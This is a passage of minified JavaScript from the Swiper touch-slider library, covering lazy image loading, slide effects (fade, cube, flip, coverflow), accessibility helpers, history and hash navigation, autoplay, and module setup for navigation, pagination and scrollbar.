                d.gestures ? (this.$wrapperEl.off("gesturestart", ".swiper-slide", e.onGestureStart, t),
                this.$wrapperEl.off("gesturechange", ".swiper-slide", e.onGestureChange, t),
                this.$wrapperEl.off("gestureend", ".swiper-slide", e.onGestureEnd, t)) : "touchstart" === this.touchEvents.start && (this.$wrapperEl.off(this.touchEvents.start, ".swiper-slide", e.onGestureStart, t),
                this.$wrapperEl.off(this.touchEvents.move, ".swiper-slide", e.onGestureChange, t),
                this.$wrapperEl.off(this.touchEvents.end, ".swiper-slide", e.onGestureEnd, t)),
                this.$wrapperEl.off(this.touchEvents.move, "." + this.params.zoom.containerClass, e.onTouchMove)
            }
        }
    }
      , Y = {
        loadInSlide: function(e, t) {
            void 0 === t && (t = !0);
            var i = this
              , a = i.params.lazy;
            if (void 0 !== e && 0 !== i.slides.length) {
                var r = i.virtual && i.params.virtual.enabled ? i.$wrapperEl.children("." + i.params.slideClass + '[data-swiper-slide-index="' + e + '"]') : i.slides.eq(e)
                  , n = r.find("." + a.elementClass + ":not(." + a.loadedClass + "):not(." + a.loadingClass + ")");
                !r.hasClass(a.elementClass) || r.hasClass(a.loadedClass) || r.hasClass(a.loadingClass) || (n = n.add(r[0])),
                0 !== n.length && n.each(function(e, n) {
                    var o = s(n);
                    o.addClass(a.loadingClass);
                    var l = o.attr("data-background")
                      , d = o.attr("data-src")
                      , h = o.attr("data-srcset")
                      , p = o.attr("data-sizes");
                    i.loadImage(o[0], d || l, h, p, !1, function() {
                        if (null != i && i && (!i || i.params) && !i.destroyed) {
                            if (l ? (o.css("background-image", 'url("' + l + '")'),
                            o.removeAttr("data-background")) : (h && (o.attr("srcset", h),
                            o.removeAttr("data-srcset")),
                            p && (o.attr("sizes", p),
                            o.removeAttr("data-sizes")),
                            d && (o.attr("src", d),
                            o.removeAttr("data-src"))),
                            o.addClass(a.loadedClass).removeClass(a.loadingClass),
                            r.find("." + a.preloaderClass).remove(),
                            i.params.loop && t) {
                                var e = r.attr("data-swiper-slide-index");
                                if (r.hasClass(i.params.slideDuplicateClass)) {
                                    var s = i.$wrapperEl.children('[data-swiper-slide-index="' + e + '"]:not(.' + i.params.slideDuplicateClass + ")");
                                    i.lazy.loadInSlide(s.index(), !1)
                                } else {
                                    var n = i.$wrapperEl.children("." + i.params.slideDuplicateClass + '[data-swiper-slide-index="' + e + '"]');
                                    i.lazy.loadInSlide(n.index(), !1)
                                }
                            }
                            i.emit("lazyImageReady", r[0], o[0])
                        }
                    }),
                    i.emit("lazyImageLoad", r[0], o[0])
                })
            }
        },
        load: function() {
            var e = this
              , t = e.$wrapperEl
              , i = e.params
              , a = e.slides
              , r = e.activeIndex
              , n = e.virtual && i.virtual.enabled
              , o = i.lazy
              , l = i.slidesPerView;
            function d(e) {
                if (n) {
                    if (t.children("." + i.slideClass + '[data-swiper-slide-index="' + e + '"]').length)
                        return !0
                } else if (a[e])
                    return !0;
                return !1
            }
            function h(e) {
                return n ? s(e).attr("data-swiper-slide-index") : s(e).index()
            }
            if ("auto" === l && (l = 0),
            e.lazy.initialImageLoaded || (e.lazy.initialImageLoaded = !0),
            e.params.watchSlidesVisibility)
                t.children("." + i.slideVisibleClass).each(function(t, i) {
                    var a = n ? s(i).attr("data-swiper-slide-index") : s(i).index();
                    e.lazy.loadInSlide(a)
                });
            else if (l > 1)
                for (var p = r; p < r + l; p += 1)
                    d(p) && e.lazy.loadInSlide(p);
            else
                e.lazy.loadInSlide(r);
            if (o.loadPrevNext)
                if (l > 1 || o.loadPrevNextAmount && o.loadPrevNextAmount > 1) {
                    for (var c = o.loadPrevNextAmount, u = l, v = Math.min(r + u + Math.max(c, u), a.length), f = Math.max(r - Math.max(u, c), 0), m = r + l; m < v; m += 1)
                        d(m) && e.lazy.loadInSlide(m);
                    for (var g = f; g < r; g += 1)
                        d(g) && e.lazy.loadInSlide(g)
                } else {
                    var b = t.children("." + i.slideNextClass);
                    b.length > 0 && e.lazy.loadInSlide(h(b));
                    var w = t.children("." + i.slidePrevClass);
                    w.length > 0 && e.lazy.loadInSlide(h(w))
                }
        }
    }
      , F = {
        LinearSpline: function(e, t) {
            var i, s, a, r, n, o = function(e, t) {
                for (s = -1,
                i = e.length; i - s > 1; )
                    e[a = i + s >> 1] <= t ? s = a : i = a;
                return i
            };
            return this.x = e,
            this.y = t,
            this.lastIndex = e.length - 1,
            this.interpolate = function(e) {
                return e ? (n = o(this.x, e),
                r = n - 1,
                (e - this.x[r]) * (this.y[n] - this.y[r]) / (this.x[n] - this.x[r]) + this.y[r]) : 0
            }
            ,
            this
        },
        getInterpolateFunction: function(e) {
            this.controller.spline || (this.controller.spline = this.params.loop ? new F.LinearSpline(this.slidesGrid,e.slidesGrid) : new F.LinearSpline(this.snapGrid,e.snapGrid))
        },
        setTranslate: function(e, t) {
            var i, s, a = this, r = a.controller.control;
            function n(e) {
                var t = a.rtlTranslate ? -a.translate : a.translate;
                "slide" === a.params.controller.by && (a.controller.getInterpolateFunction(e),
                s = -a.controller.spline.interpolate(-t)),
                s && "container" !== a.params.controller.by || (i = (e.maxTranslate() - e.minTranslate()) / (a.maxTranslate() - a.minTranslate()),
                s = (t - a.minTranslate()) * i + e.minTranslate()),
                a.params.controller.inverse && (s = e.maxTranslate() - s),
                e.updateProgress(s),
                e.setTranslate(s, a),
                e.updateActiveIndex(),
                e.updateSlidesClasses()
            }
            if (Array.isArray(r))
                for (var o = 0; o < r.length; o += 1)
                    r[o] !== t && r[o]instanceof C && n(r[o]);
            else
                r instanceof C && t !== r && n(r)
        },
        setTransition: function(e, t) {
            var i, s = this, a = s.controller.control;
            function r(t) {
                t.setTransition(e, s),
                0 !== e && (t.transitionStart(),
                t.params.autoHeight && l.nextTick(function() {
                    t.updateAutoHeight()
                }),
                t.$wrapperEl.transitionEnd(function() {
                    a && (t.params.loop && "slide" === s.params.controller.by && t.loopFix(),
                    t.transitionEnd())
                }))
            }
            if (Array.isArray(a))
                for (i = 0; i < a.length; i += 1)
                    a[i] !== t && a[i]instanceof C && r(a[i]);
            else
                a instanceof C && t !== a && r(a)
        }
    }
      , R = {
        makeElFocusable: function(e) {
            return e.attr("tabIndex", "0"),
            e
        },
        addElRole: function(e, t) {
            return e.attr("role", t),
            e
        },
        addElLabel: function(e, t) {
            return e.attr("aria-label", t),
            e
        },
        disableEl: function(e) {
            return e.attr("aria-disabled", !0),
            e
        },
        enableEl: function(e) {
            return e.attr("aria-disabled", !1),
            e
        },
        onEnterKey: function(e) {
            var t = this.params.a11y;
            if (13 === e.keyCode) {
                var i = s(e.target);
                this.navigation && this.navigation.$nextEl && i.is(this.navigation.$nextEl) && (this.isEnd && !this.params.loop || this.slideNext(),
                this.isEnd ? this.a11y.notify(t.lastSlideMessage) : this.a11y.notify(t.nextSlideMessage)),
                this.navigation && this.navigation.$prevEl && i.is(this.navigation.$prevEl) && (this.isBeginning && !this.params.loop || this.slidePrev(),
                this.isBeginning ? this.a11y.notify(t.firstSlideMessage) : this.a11y.notify(t.prevSlideMessage)),
                this.pagination && i.is("." + this.params.pagination.bulletClass) && i[0].click()
            }
        },
        notify: function(e) {
            var t = this.a11y.liveRegion;
            0 !== t.length && (t.html(""),
            t.html(e))
        },
        updateNavigation: function() {
            if (!this.params.loop) {
                var e = this.navigation
                  , t = e.$nextEl
                  , i = e.$prevEl;
                i && i.length > 0 && (this.isBeginning ? this.a11y.disableEl(i) : this.a11y.enableEl(i)),
                t && t.length > 0 && (this.isEnd ? this.a11y.disableEl(t) : this.a11y.enableEl(t))
            }
        },
        updatePagination: function() {
            var e = this
              , t = e.params.a11y;
            e.pagination && e.params.pagination.clickable && e.pagination.bullets && e.pagination.bullets.length && e.pagination.bullets.each(function(i, a) {
                var r = s(a);
                e.a11y.makeElFocusable(r),
                e.a11y.addElRole(r, "button"),
                e.a11y.addElLabel(r, t.paginationBulletMessage.replace(/{{index}}/, r.index() + 1))
            })
        },
        init: function() {
            this.$el.append(this.a11y.liveRegion);
            var e, t, i = this.params.a11y;
            this.navigation && this.navigation.$nextEl && (e = this.navigation.$nextEl),
            this.navigation && this.navigation.$prevEl && (t = this.navigation.$prevEl),
            e && (this.a11y.makeElFocusable(e),
            this.a11y.addElRole(e, "button"),
            this.a11y.addElLabel(e, i.nextSlideMessage),
            e.on("keydown", this.a11y.onEnterKey)),
            t && (this.a11y.makeElFocusable(t),
            this.a11y.addElRole(t, "button"),
            this.a11y.addElLabel(t, i.prevSlideMessage),
            t.on("keydown", this.a11y.onEnterKey)),
            this.pagination && this.params.pagination.clickable && this.pagination.bullets && this.pagination.bullets.length && this.pagination.$el.on("keydown", "." + this.params.pagination.bulletClass, this.a11y.onEnterKey)
        },
        destroy: function() {
            var e, t;
            this.a11y.liveRegion && this.a11y.liveRegion.length > 0 && this.a11y.liveRegion.remove(),
            this.navigation && this.navigation.$nextEl && (e = this.navigation.$nextEl),
            this.navigation && this.navigation.$prevEl && (t = this.navigation.$prevEl),
            e && e.off("keydown", this.a11y.onEnterKey),
            t && t.off("keydown", this.a11y.onEnterKey),
            this.pagination && this.params.pagination.clickable && this.pagination.bullets && this.pagination.bullets.length && this.pagination.$el.off("keydown", "." + this.params.pagination.bulletClass, this.a11y.onEnterKey)
        }
    }
      , q = {
        init: function() {
            if (this.params.history) {
                if (!t.history || !t.history.pushState)
                    return this.params.history.enabled = !1,
                    void (this.params.hashNavigation.enabled = !0);
                var e = this.history;
                e.initialized = !0,
                e.paths = q.getPathValues(),
                (e.paths.key || e.paths.value) && (e.scrollToSlide(0, e.paths.value, this.params.runCallbacksOnInit),
                this.params.history.replaceState || t.addEventListener("popstate", this.history.setHistoryPopState))
            }
        },
        destroy: function() {
            this.params.history.replaceState || t.removeEventListener("popstate", this.history.setHistoryPopState)
        },
        setHistoryPopState: function() {
            this.history.paths = q.getPathValues(),
            this.history.scrollToSlide(this.params.speed, this.history.paths.value, !1)
        },
        getPathValues: function() {
            var e = t.location.pathname.slice(1).split("/").filter(function(e) {
                return "" !== e
            })
              , i = e.length;
            return {
                key: e[i - 2],
                value: e[i - 1]
            }
        },
        setHistory: function(e, i) {
            if (this.history.initialized && this.params.history.enabled) {
                var s = this.slides.eq(i)
                  , a = q.slugify(s.attr("data-history"));
                t.location.pathname.includes(e) || (a = e + "/" + a);
                var r = t.history.state;
                r && r.value === a || (this.params.history.replaceState ? t.history.replaceState({
                    value: a
                }, null, a) : t.history.pushState({
                    value: a
                }, null, a))
            }
        },
        slugify: function(e) {
            return e.toString().replace(/\s+/g, "-").replace(/[^\w-]+/g, "").replace(/--+/g, "-").replace(/^-+/, "").replace(/-+$/, "")
        },
        scrollToSlide: function(e, t, i) {
            if (t)
                for (var s = 0, a = this.slides.length; s < a; s += 1) {
                    var r = this.slides.eq(s);
                    if (q.slugify(r.attr("data-history")) === t && !r.hasClass(this.params.slideDuplicateClass)) {
                        var n = r.index();
                        this.slideTo(n, e, i)
                    }
                }
            else
                this.slideTo(0, e, i)
        }
    }
      , W = {
        onHashCange: function() {
            var t = e.location.hash.replace("#", "");
            if (t !== this.slides.eq(this.activeIndex).attr("data-hash")) {
                var i = this.$wrapperEl.children("." + this.params.slideClass + '[data-hash="' + t + '"]').index();
                if (void 0 === i)
                    return;
                this.slideTo(i)
            }
        },
        setHash: function() {
            if (this.hashNavigation.initialized && this.params.hashNavigation.enabled)
                if (this.params.hashNavigation.replaceState && t.history && t.history.replaceState)
                    t.history.replaceState(null, null, "#" + this.slides.eq(this.activeIndex).attr("data-hash") || "");
                else {
                    var i = this.slides.eq(this.activeIndex)
                      , s = i.attr("data-hash") || i.attr("data-history");
                    e.location.hash = s || ""
                }
        },
        init: function() {
            if (!(!this.params.hashNavigation.enabled || this.params.history && this.params.history.enabled)) {
                this.hashNavigation.initialized = !0;
                var i = e.location.hash.replace("#", "");
                if (i)
                    for (var a = 0, r = this.slides.length; a < r; a += 1) {
                        var n = this.slides.eq(a);
                        if ((n.attr("data-hash") || n.attr("data-history")) === i && !n.hasClass(this.params.slideDuplicateClass)) {
                            var o = n.index();
                            this.slideTo(o, 0, this.params.runCallbacksOnInit, !0)
                        }
                    }
                this.params.hashNavigation.watchState && s(t).on("hashchange", this.hashNavigation.onHashCange)
            }
        },
        destroy: function() {
            this.params.hashNavigation.watchState && s(t).off("hashchange", this.hashNavigation.onHashCange)
        }
    }
      , j = {
        run: function() {
            var e = this
              , t = e.slides.eq(e.activeIndex)
              , i = e.params.autoplay.delay;
            t.attr("data-swiper-autoplay") && (i = t.attr("data-swiper-autoplay") || e.params.autoplay.delay),
            clearTimeout(e.autoplay.timeout),
            e.autoplay.timeout = l.nextTick(function() {
                e.params.autoplay.reverseDirection ? e.params.loop ? (e.loopFix(),
                e.slidePrev(e.params.speed, !0, !0),
                e.emit("autoplay")) : e.isBeginning ? e.params.autoplay.stopOnLastSlide ? e.autoplay.stop() : (e.slideTo(e.slides.length - 1, e.params.speed, !0, !0),
                e.emit("autoplay")) : (e.slidePrev(e.params.speed, !0, !0),
                e.emit("autoplay")) : e.params.loop ? (e.loopFix(),
                e.slideNext(e.params.speed, !0, !0),
                e.emit("autoplay")) : e.isEnd ? e.params.autoplay.stopOnLastSlide ? e.autoplay.stop() : (e.slideTo(0, e.params.speed, !0, !0),
                e.emit("autoplay")) : (e.slideNext(e.params.speed, !0, !0),
                e.emit("autoplay"))
            }, i)
        },
        start: function() {
            return void 0 === this.autoplay.timeout && (!this.autoplay.running && (this.autoplay.running = !0,
            this.emit("autoplayStart"),
            this.autoplay.run(),
            !0))
        },
        stop: function() {
            return !!this.autoplay.running && (void 0 !== this.autoplay.timeout && (this.autoplay.timeout && (clearTimeout(this.autoplay.timeout),
            this.autoplay.timeout = void 0),
            this.autoplay.running = !1,
            this.emit("autoplayStop"),
            !0))
        },
        pause: function(e) {
            this.autoplay.running && (this.autoplay.paused || (this.autoplay.timeout && clearTimeout(this.autoplay.timeout),
            this.autoplay.paused = !0,
            0 !== e && this.params.autoplay.waitForTransition ? (this.$wrapperEl[0].addEventListener("transitionend", this.autoplay.onTransitionEnd),
            this.$wrapperEl[0].addEventListener("webkitTransitionEnd", this.autoplay.onTransitionEnd)) : (this.autoplay.paused = !1,
            this.autoplay.run())))
        }
    }
      , U = {
        setTranslate: function() {
            for (var e = this.slides, t = 0; t < e.length; t += 1) {
                var i = this.slides.eq(t)
                  , s = -i[0].swiperSlideOffset;
                this.params.virtualTranslate || (s -= this.translate);
                var a = 0;
                this.isHorizontal() || (a = s,
                s = 0);
                var r = this.params.fadeEffect.crossFade ? Math.max(1 - Math.abs(i[0].progress), 0) : 1 + Math.min(Math.max(i[0].progress, -1), 0);
                i.css({
                    opacity: r
                }).transform("translate3d(" + s + "px, " + a + "px, 0px)")
            }
        },
        setTransition: function(e) {
            var t = this
              , i = t.slides
              , s = t.$wrapperEl;
            if (i.transition(e),
            t.params.virtualTranslate && 0 !== e) {
                var a = !1;
                i.transitionEnd(function() {
                    if (!a && t && !t.destroyed) {
                        a = !0,
                        t.animating = !1;
                        for (var e = ["webkitTransitionEnd", "transitionend"], i = 0; i < e.length; i += 1)
                            s.trigger(e[i])
                    }
                })
            }
        }
    }
      , K = {
        setTranslate: function() {
            var e, t = this.$el, i = this.$wrapperEl, a = this.slides, r = this.width, n = this.height, o = this.rtlTranslate, l = this.size, d = this.params.cubeEffect, p = this.isHorizontal(), c = this.virtual && this.params.virtual.enabled, u = 0;
            d.shadow && (p ? (0 === (e = i.find(".swiper-cube-shadow")).length && (e = s('<div class="swiper-cube-shadow"></div>'),
            i.append(e)),
            e.css({
                height: r + "px"
            })) : 0 === (e = t.find(".swiper-cube-shadow")).length && (e = s('<div class="swiper-cube-shadow"></div>'),
            t.append(e)));
            for (var v = 0; v < a.length; v += 1) {
                var f = a.eq(v)
                  , m = v;
                c && (m = parseInt(f.attr("data-swiper-slide-index"), 10));
                var g = 90 * m
                  , b = Math.floor(g / 360);
                o && (g = -g,
                b = Math.floor(-g / 360));
                var w = Math.max(Math.min(f[0].progress, 1), -1)
                  , y = 0
                  , x = 0
                  , T = 0;
                m % 4 == 0 ? (y = 4 * -b * l,
                T = 0) : (m - 1) % 4 == 0 ? (y = 0,
                T = 4 * -b * l) : (m - 2) % 4 == 0 ? (y = l + 4 * b * l,
                T = l) : (m - 3) % 4 == 0 && (y = -l,
                T = 3 * l + 4 * l * b),
                o && (y = -y),
                p || (x = y,
                y = 0);
                var E = "rotateX(" + (p ? 0 : -g) + "deg) rotateY(" + (p ? g : 0) + "deg) translate3d(" + y + "px, " + x + "px, " + T + "px)";
                if (w <= 1 && w > -1 && (u = 90 * m + 90 * w,
                o && (u = 90 * -m - 90 * w)),
                f.transform(E),
                d.slideShadows) {
                    var S = p ? f.find(".swiper-slide-shadow-left") : f.find(".swiper-slide-shadow-top")
                      , C = p ? f.find(".swiper-slide-shadow-right") : f.find(".swiper-slide-shadow-bottom");
                    0 === S.length && (S = s('<div class="swiper-slide-shadow-' + (p ? "left" : "top") + '"></div>'),
                    f.append(S)),
                    0 === C.length && (C = s('<div class="swiper-slide-shadow-' + (p ? "right" : "bottom") + '"></div>'),
                    f.append(C)),
                    S.length && (S[0].style.opacity = Math.max(-w, 0)),
                    C.length && (C[0].style.opacity = Math.max(w, 0))
                }
            }
            if (i.css({
                "-webkit-transform-origin": "50% 50% -" + l / 2 + "px",
                "-moz-transform-origin": "50% 50% -" + l / 2 + "px",
                "-ms-transform-origin": "50% 50% -" + l / 2 + "px",
                "transform-origin": "50% 50% -" + l / 2 + "px"
            }),
            d.shadow)
                if (p)
                    e.transform("translate3d(0px, " + (r / 2 + d.shadowOffset) + "px, " + -r / 2 + "px) rotateX(90deg) rotateZ(0deg) scale(" + d.shadowScale + ")");
                else {
                    var M = Math.abs(u) - 90 * Math.floor(Math.abs(u) / 90)
                      , P = 1.5 - (Math.sin(2 * M * Math.PI / 360) / 2 + Math.cos(2 * M * Math.PI / 360) / 2)
                      , k = d.shadowScale
                      , z = d.shadowScale / P
                      , $ = d.shadowOffset;
                    e.transform("scale3d(" + k + ", 1, " + z + ") translate3d(0px, " + (n / 2 + $) + "px, " + -n / 2 / z + "px) rotateX(-90deg)")
                }
            var I = h.isSafari || h.isUiWebView ? -l / 2 : 0;
            i.transform("translate3d(0px,0," + I + "px) rotateX(" + (this.isHorizontal() ? 0 : u) + "deg) rotateY(" + (this.isHorizontal() ? -u : 0) + "deg)")
        },
        setTransition: function(e) {
            var t = this.$el;
            this.slides.transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e),
            this.params.cubeEffect.shadow && !this.isHorizontal() && t.find(".swiper-cube-shadow").transition(e)
        }
    }
      , _ = {
        setTranslate: function() {
            for (var e = this.slides, t = this.rtlTranslate, i = 0; i < e.length; i += 1) {
                var a = e.eq(i)
                  , r = a[0].progress;
                this.params.flipEffect.limitRotation && (r = Math.max(Math.min(a[0].progress, 1), -1));
                var n = -180 * r
                  , o = 0
                  , l = -a[0].swiperSlideOffset
                  , d = 0;
                if (this.isHorizontal() ? t && (n = -n) : (d = l,
                l = 0,
                o = -n,
                n = 0),
                a[0].style.zIndex = -Math.abs(Math.round(r)) + e.length,
                this.params.flipEffect.slideShadows) {
                    var h = this.isHorizontal() ? a.find(".swiper-slide-shadow-left") : a.find(".swiper-slide-shadow-top")
                      , p = this.isHorizontal() ? a.find(".swiper-slide-shadow-right") : a.find(".swiper-slide-shadow-bottom");
                    0 === h.length && (h = s('<div class="swiper-slide-shadow-' + (this.isHorizontal() ? "left" : "top") + '"></div>'),
                    a.append(h)),
                    0 === p.length && (p = s('<div class="swiper-slide-shadow-' + (this.isHorizontal() ? "right" : "bottom") + '"></div>'),
                    a.append(p)),
                    h.length && (h[0].style.opacity = Math.max(-r, 0)),
                    p.length && (p[0].style.opacity = Math.max(r, 0))
                }
                a.transform("translate3d(" + l + "px, " + d + "px, 0px) rotateX(" + o + "deg) rotateY(" + n + "deg)")
            }
        },
        setTransition: function(e) {
            var t = this
              , i = t.slides
              , s = t.activeIndex
              , a = t.$wrapperEl;
            if (i.transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e),
            t.params.virtualTranslate && 0 !== e) {
                var r = !1;
                i.eq(s).transitionEnd(function() {
                    if (!r && t && !t.destroyed) {
                        r = !0,
                        t.animating = !1;
                        for (var e = ["webkitTransitionEnd", "transitionend"], i = 0; i < e.length; i += 1)
                            a.trigger(e[i])
                    }
                })
            }
        }
    }
      , Z = {
        setTranslate: function() {
            for (var e = this.width, t = this.height, i = this.slides, a = this.$wrapperEl, r = this.slidesSizesGrid, n = this.params.coverflowEffect, o = this.isHorizontal(), l = this.translate, h = o ? e / 2 - l : t / 2 - l, p = o ? n.rotate : -n.rotate, c = n.depth, u = 0, v = i.length; u < v; u += 1) {
                var f = i.eq(u)
                  , m = r[u]
                  , g = (h - f[0].swiperSlideOffset - m / 2) / m * n.modifier
                  , b = o ? p * g : 0
                  , w = o ? 0 : p * g
                  , y = -c * Math.abs(g)
                  , x = o ? 0 : n.stretch * g
                  , T = o ? n.stretch * g : 0;
                Math.abs(T) < .001 && (T = 0),
                Math.abs(x) < .001 && (x = 0),
                Math.abs(y) < .001 && (y = 0),
                Math.abs(b) < .001 && (b = 0),
                Math.abs(w) < .001 && (w = 0);
                var E = "translate3d(" + T + "px," + x + "px," + y + "px)  rotateX(" + w + "deg) rotateY(" + b + "deg)";
                if (f.transform(E),
                f[0].style.zIndex = 1 - Math.abs(Math.round(g)),
                n.slideShadows) {
                    var S = o ? f.find(".swiper-slide-shadow-left") : f.find(".swiper-slide-shadow-top")
                      , C = o ? f.find(".swiper-slide-shadow-right") : f.find(".swiper-slide-shadow-bottom");
                    0 === S.length && (S = s('<div class="swiper-slide-shadow-' + (o ? "left" : "top") + '"></div>'),
                    f.append(S)),
                    0 === C.length && (C = s('<div class="swiper-slide-shadow-' + (o ? "right" : "bottom") + '"></div>'),
                    f.append(C)),
                    S.length && (S[0].style.opacity = g > 0 ? g : 0),
                    C.length && (C[0].style.opacity = -g > 0 ? -g : 0)
                }
            }
            (d.pointerEvents || d.prefixedPointerEvents) && (a[0].style.perspectiveOrigin = h + "px 50%")
        },
        setTransition: function(e) {
            this.slides.transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e)
        }
    }
      , Q = {
        init: function() {
            var e = this.params.thumbs
              , t = this.constructor;
            e.swiper instanceof t ? (this.thumbs.swiper = e.swiper,
            l.extend(this.thumbs.swiper.originalParams, {
                watchSlidesProgress: !0,
                slideToClickedSlide: !1
            }),
            l.extend(this.thumbs.swiper.params, {
                watchSlidesProgress: !0,
                slideToClickedSlide: !1
            })) : l.isObject(e.swiper) && (this.thumbs.swiper = new t(l.extend({}, e.swiper, {
                watchSlidesVisibility: !0,
                watchSlidesProgress: !0,
                slideToClickedSlide: !1
            })),
            this.thumbs.swiperCreated = !0),
            this.thumbs.swiper.$el.addClass(this.params.thumbs.thumbsContainerClass),
            this.thumbs.swiper.on("tap", this.thumbs.onThumbClick)
        },
        onThumbClick: function() {
            var e = this.thumbs.swiper;
            if (e) {
                var t = e.clickedIndex
                  , i = e.clickedSlide;
                if (!(i && s(i).hasClass(this.params.thumbs.slideThumbActiveClass) || null == t)) {
                    var a;
                    if (a = e.params.loop ? parseInt(s(e.clickedSlide).attr("data-swiper-slide-index"), 10) : t,
                    this.params.loop) {
                        var r = this.activeIndex;
                        this.slides.eq(r).hasClass(this.params.slideDuplicateClass) && (this.loopFix(),
                        this._clientLeft = this.$wrapperEl[0].clientLeft,
                        r = this.activeIndex);
                        var n = this.slides.eq(r).prevAll('[data-swiper-slide-index="' + a + '"]').eq(0).index()
                          , o = this.slides.eq(r).nextAll('[data-swiper-slide-index="' + a + '"]').eq(0).index();
                        a = void 0 === n ? o : void 0 === o ? n : o - r < r - n ? o : n
                    }
                    this.slideTo(a)
                }
            }
        },
        update: function(e) {
            var t = this.thumbs.swiper;
            if (t) {
                var i = "auto" === t.params.slidesPerView ? t.slidesPerViewDynamic() : t.params.slidesPerView;
                if (this.realIndex !== t.realIndex) {
                    var s, a = t.activeIndex;
                    if (t.params.loop) {
                        t.slides.eq(a).hasClass(t.params.slideDuplicateClass) && (t.loopFix(),
                        t._clientLeft = t.$wrapperEl[0].clientLeft,
                        a = t.activeIndex);
                        var r = t.slides.eq(a).prevAll('[data-swiper-slide-index="' + this.realIndex + '"]').eq(0).index()
                          , n = t.slides.eq(a).nextAll('[data-swiper-slide-index="' + this.realIndex + '"]').eq(0).index();
                        s = void 0 === r ? n : void 0 === n ? r : n - a == a - r ? a : n - a < a - r ? n : r
                    } else
                        s = this.realIndex;
                    t.visibleSlidesIndexes && t.visibleSlidesIndexes.indexOf(s) < 0 && (t.params.centeredSlides ? s = s > a ? s - Math.floor(i / 2) + 1 : s + Math.floor(i / 2) - 1 : s > a && (s = s - i + 1),
                    t.slideTo(s, e ? 0 : void 0))
                }
                var o = 1
                  , l = this.params.thumbs.slideThumbActiveClass;
                if (this.params.slidesPerView > 1 && !this.params.centeredSlides && (o = this.params.slidesPerView),
                t.slides.removeClass(l),
                t.params.loop || t.params.virtual)
                    for (var d = 0; d < o; d += 1)
                        t.$wrapperEl.children('[data-swiper-slide-index="' + (this.realIndex + d) + '"]').addClass(l);
                else
                    for (var h = 0; h < o; h += 1)
                        t.slides.eq(this.realIndex + h).addClass(l)
            }
        }
    }
      , J = [M, P, k, z, I, D, A, {
        name: "mousewheel",
        params: {
            mousewheel: {
                enabled: !1,
                releaseOnEdges: !1,
                invert: !1,
                forceToAxis: !1,
                sensitivity: 1,
                eventsTarged: "container"
            }
        },
        create: function() {
            l.extend(this, {
                mousewheel: {
                    enabled: !1,
                    enable: H.enable.bind(this),
                    disable: H.disable.bind(this),
                    handle: H.handle.bind(this),
                    handleMouseEnter: H.handleMouseEnter.bind(this),
                    handleMouseLeave: H.handleMouseLeave.bind(this),
                    lastScrollTime: l.now()
                }
            })
        },
        on: {
            init: function() {
                this.params.mousewheel.enabled && this.mousewheel.enable()
            },
            destroy: function() {
                this.mousewheel.enabled && this.mousewheel.disable()
            }
        }
    }, {
        name: "navigation",
        params: {
            navigation: {
                nextEl: null,
                prevEl: null,
                hideOnClick: !1,
                disabledClass: "swiper-button-disabled",
                hiddenClass: "swiper-button-hidden",
                lockClass: "swiper-button-lock"
            }
        },
        create: function() {
            l.extend(this, {
                navigation: {
                    init: G.init.bind(this),
                    update: G.update.bind(this),
                    destroy: G.destroy.bind(this),
                    onNextClick: G.onNextClick.bind(this),
                    onPrevClick: G.onPrevClick.bind(this)
                }
            })
        },
        on: {
            init: function() {
                this.navigation.init(),
                this.navigation.update()
            },
            toEdge: function() {
                this.navigation.update()
            },
            fromEdge: function() {
                this.navigation.update()
            },
            destroy: function() {
                this.navigation.destroy()
            },
            click: function(e) {
                var t, i = this.navigation, a = i.$nextEl, r = i.$prevEl;
                !this.params.navigation.hideOnClick || s(e.target).is(r) || s(e.target).is(a) || (a ? t = a.hasClass(this.params.navigation.hiddenClass) : r && (t = r.hasClass(this.params.navigation.hiddenClass)),
                !0 === t ? this.emit("navigationShow", this) : this.emit("navigationHide", this),
                a && a.toggleClass(this.params.navigation.hiddenClass),
                r && r.toggleClass(this.params.navigation.hiddenClass))
            }
        }
    }, {
        name: "pagination",
        params: {
            pagination: {
                el: null,
                bulletElement: "span",
                clickable: !1,
                hideOnClick: !1,
                renderBullet: null,
                renderProgressbar: null,
                renderFraction: null,
                renderCustom: null,
                progressbarOpposite: !1,
                type: "bullets",
                dynamicBullets: !1,
                dynamicMainBullets: 1,
                formatFractionCurrent: function(e) {
                    return e
                },
                formatFractionTotal: function(e) {
                    return e
                },
                bulletClass: "swiper-pagination-bullet",
                bulletActiveClass: "swiper-pagination-bullet-active",
                modifierClass: "swiper-pagination-",
                currentClass: "swiper-pagination-current",
                totalClass: "swiper-pagination-total",
                hiddenClass: "swiper-pagination-hidden",
                progressbarFillClass: "swiper-pagination-progressbar-fill",
                progressbarOppositeClass: "swiper-pagination-progressbar-opposite",
                clickableClass: "swiper-pagination-clickable",
                lockClass: "swiper-pagination-lock"
            }
        },
        create: function() {
            l.extend(this, {
                pagination: {
                    init: N.init.bind(this),
                    render: N.render.bind(this),
                    update: N.update.bind(this),
                    destroy: N.destroy.bind(this),
                    dynamicBulletIndex: 0
                }
            })
        },
        on: {
            init: function() {
                this.pagination.init(),
                this.pagination.render(),
                this.pagination.update()
            },
            activeIndexChange: function() {
                this.params.loop ? this.pagination.update() : void 0 === this.snapIndex && this.pagination.update()
            },
            snapIndexChange: function() {
                this.params.loop || this.pagination.update()
            },
            slidesLengthChange: function() {
                this.params.loop && (this.pagination.render(),
                this.pagination.update())
            },
            snapGridLengthChange: function() {
                this.params.loop || (this.pagination.render(),
                this.pagination.update())
            },
            destroy: function() {
                this.pagination.destroy()
            },
            click: function(e) {
                this.params.pagination.el && this.params.pagination.hideOnClick && this.pagination.$el.length > 0 && !s(e.target).hasClass(this.params.pagination.bulletClass) && (!0 === this.pagination.$el.hasClass(this.params.pagination.hiddenClass) ? this.emit("paginationShow", this) : this.emit("paginationHide", this),
                this.pagination.$el.toggleClass(this.params.pagination.hiddenClass))
            }
        }
    }, {
        name: "scrollbar",
        params: {
            scrollbar: {
                el: null,
                dragSize: "auto",
                hide: !1,
                draggable: !1,
                snapOnRelease: !0,
                lockClass: "swiper-scrollbar-lock",
                dragClass: "swiper-scrollbar-drag"
            }
        },
        create: function() {
            l.extend(this, {
                scrollbar: {
                    init: B.init.bind(this),
                    destroy: B.destroy.bind(this),
